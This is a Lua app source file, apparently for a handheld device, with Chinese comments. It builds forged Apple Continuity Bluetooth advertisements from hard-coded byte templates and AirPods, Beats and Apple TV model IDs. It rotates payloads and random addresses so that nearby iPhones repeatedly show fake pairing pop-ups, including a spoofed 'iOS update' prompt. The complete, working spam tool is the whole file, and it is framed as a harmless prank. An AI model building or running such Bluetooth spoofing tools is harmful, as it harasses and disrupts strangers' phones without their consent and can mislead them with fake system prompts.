-- 邪恶苹果汁（eviljuice 1.0）：广播伪造的 Apple Continuity「附近设备」消息，
-- 让附近 iPhone 反复弹出 AirPods / Apple TV 等配对弹窗。仅供熟人间的无害恶作剧。
-- 数据格式参考 EvilAppleJuice-ESP32（MIT）：
--   音频类 31 字节：1e ff 4c 00 07 19 07 [型号] 20 75 aa 30 01 00 00 45 12 12 12
--   设置类 23 字节：16 ff 4c 00 04 04 2a 00 00 00 0f 05 c1 [型号] 60 4c 95 00 00 10 00 00 00
-- 需要 2.9.34+ 固件：ble.adv_start 每次调用自动轮换随机广播地址（iPhone 视作新设备），
-- 本应用只决定「装成谁」并周期轮换。

local W, H = ui.size()
local TOP = ui.content_top()
local LH = ui.line_height()
local MARGIN = 16
local TEXT_W = W - MARGIN * 2

-- 音频设备（AirPods / Beats 全家桶；0x2e 是「软件更新」弹窗）
local AUDIO = {
  { 0x02, "AirPods" },          { 0x03, "PowerBeats" },       { 0x05, "Beats X" },
  { 0x06, "Beats Solo 3" },     { 0x09, "Beats Studio 3" },   { 0x0a, "AirPods Max" },
  { 0x0b, "PowerBeats Pro" },   { 0x0c, "Beats Solo Pro" },   { 0x0e, "AirPods Pro" },
  { 0x0f, "AirPods 2" },        { 0x10, "Beats Flex" },       { 0x11, "Studio Buds" },
  { 0x12, "Beats Fit Pro" },    { 0x13, "AirPods 3" },        { 0x14, "AirPods Pro 2" },
  { 0x16, "Studio Buds+" },     { 0x17, "Beats Studio Pro" }, { 0x24, "AirPods Pro 2 (C口)" },
  { 0x25, "Beats Solo 4" },     { 0x26, "Beats Solo Buds" },  { 0x2e, "iOS 系统更新" },
  { 0x2f, "Powerbeats Fit" },
}
-- 设置弹窗（Apple TV / 新 iPhone 等，隔得远也能弹）
local SETUP = {
  { 0x01, "Apple TV 设置" }, { 0x02, "号码迁移" },     { 0x06, "Apple TV 配对" },
  { 0x09, "设置新 iPhone" }, { 0x0b, "HomePod 设置" }, { 0x0d, "HomeKit 设置" },
  { 0x13, "Apple TV 键盘" }, { 0x1e, "电视色彩平衡" }, { 0x20, "Apple TV 新用户" },
  { 0x24, "Vision Pro" },    { 0x27, "TV 加入网络" },  { 0x2b, "Apple ID 设置" },
  { 0xc0, "音频同步" },
}

local MODES = {
  { name = "随机混播", hint = "音频 + 设置轮着来，覆盖面最广" },
  { name = "只弹音频设备", hint = "AirPods / Beats / 系统更新" },
  { name = "只弹设置弹窗", hint = "Apple TV / 新 iPhone / Vision Pro" },
  { name = "只弹 AirPods", hint = "原项目实测弹得最凶的一种" },
}

local IDLE_MS = 300        -- 固件 on_idle 调用周期约 300ms
local MAX_TICKS = 3000     -- 连续广播约 15 分钟自动停，防止忘了关一直耗电

local view = "home"        -- home | run
local sel = 1
local mode = 1
local sent = 0             -- 已广播组数（每组 = 一次轮换的完整广播数据）
local current = ""         -- 当前伪装的设备
local ticks = 0            -- on_idle 计数（≈运行时长）
local marked = 0           -- 上次请求重绘计数时的 ticks
local err = ""
local HAS_BLE = (type(ble) == "table")   -- 旧固件没有 ble 模块，提示先升级

local function audio_payload(id)
  return string.char(0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, id,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12)
end

local function setup_payload(id)
  return string.char(0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00,
    0x0f, 0x05, 0xc1, id, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)
end

-- 按当前模式随机挑一个「伪装对象」，返回广播数据与名字
local function pick()
  if mode == 4 then return audio_payload(0x02), "AirPods" end
  local list = AUDIO
  if mode == 3 or (mode == 1 and math.random(2) == 2) then list = SETUP end
  local dev = list[math.random(#list)]
  if list == AUDIO then return audio_payload(dev[1]), dev[2] end
  return setup_payload(dev[1]), dev[2]
end

local function draw_home()
  ui.clear()
  ui.title("邪恶苹果汁")
  local y = TOP + 6
  ui.text("广播伪造的苹果「附近设备」消息，让附近", MARGIN, y, TEXT_W)
  ui.text("iPhone 不停弹出配对弹窗。仅供熟人之间", MARGIN, y + LH, TEXT_W)
  ui.text("的无害恶作剧。", MARGIN, y + LH * 2, TEXT_W)
  local row_h = LH * 2 + 16
  local list_y = y + LH * 3 + 14
  for i = 1, #MODES do
    local ry = list_y + (i - 1) * row_h
    ui.text(MODES[i].name, MARGIN + 12, ry + 4, TEXT_W - 24)
    ui.text(MODES[i].hint, MARGIN + 12, ry + 4 + LH, TEXT_W - 24)
    if i == sel then
      ui.rect(MARGIN, ry, TEXT_W, row_h - 4, false)
      ui.rect(MARGIN + 2, ry + 2, TEXT_W - 4, row_h - 8, false)
    end
  end
  if err ~= "" then
    ui.text(err, MARGIN, H - 58, TEXT_W)
  elseif HAS_BLE and not ble.running() then
    ui.text("蓝牙未开启：设置 › 网络设置 › 蓝牙 打开后才能开始",
      MARGIN, H - 58, TEXT_W)
  end
  ui.footer("语音 开始 · 左右 选择 · 返回 退出")
end

local function draw_run()
  ui.clear()
  ui.title("邪恶苹果汁 · 运行中")
  local y = TOP + 30
  ui.center("正在伪装：" .. current, y)
  y = y + LH * 2 + 6
  ui.center(sent .. " 组", y)
  y = y + LH * 2
  local remain = math.max(0, math.floor((MAX_TICKS - ticks) * IDLE_MS / 1000))
  ui.center("剩余 " .. remain .. " 秒", y)
  ui.text("附近 iPhone 会反复弹出配对弹窗。语音键或返回键随时停止。",
    MARGIN, H - 88, TEXT_W)
  ui.footer("语音/返回 停止")
end

function draw()
  if view == "run" then draw_run() else draw_home() end
end

local function start_run()
  if not HAS_BLE then
    err = "需要 2.9.35 及以上固件，请先升级系统"
    return
  end
  if not ble.running() then
    err = "蓝牙未开启：请到 设置 › 网络设置 › 蓝牙 打开后再试"
    draw_home()
    ui.flush(true)
    return
  end
  local payload, name = pick()
  if not ble.adv_start(payload, 25) then
    err = "广播启动失败：请确认 网络设置 › 蓝牙 已开启"
    draw_home()
    ui.flush(true)
    return
  end
  sent, ticks, marked = 1, 0, 0
  current = name
  err = ""
  view = "run"
  draw_run()
  ui.flush(true)   -- 进运行页整屏刷新，清掉列表页残影
end

local function stop_run()
  ble.adv_stop()
  view = "home"
end

function on_key(action)
  if view == "home" then
    if action == "prev" then
      sel = sel == 1 and #MODES or sel - 1
    elseif action == "next" then
      sel = sel == #MODES and 1 or sel + 1
    elseif action == "ok" then
      mode = sel
      start_run()
    elseif action == "back" then
      sys.exit()
    end
  elseif view == "run" then
    if action == "ok" or action == "back" or action == "voice_long" then
      stop_run()   -- 停止后宿主会调用 draw() 重绘主页（局刷）
    end
  end
end

-- 空闲回调（约 300ms 一次）：轮换伪装对象与广播地址；每约 1.2 秒局刷一次计数
function on_idle()
  if view ~= "run" then return false end
  ticks = ticks + 1
  if ticks >= MAX_TICKS then
    stop_run()
    return true   -- 宿主重绘回主页
  end
  local payload, name = pick()
  if ble.adv_start(payload, 25) then
    sent = sent + 1
    current = name
  end
  if ticks - marked >= 4 then
    marked = ticks
    return true
  end
  return false
end
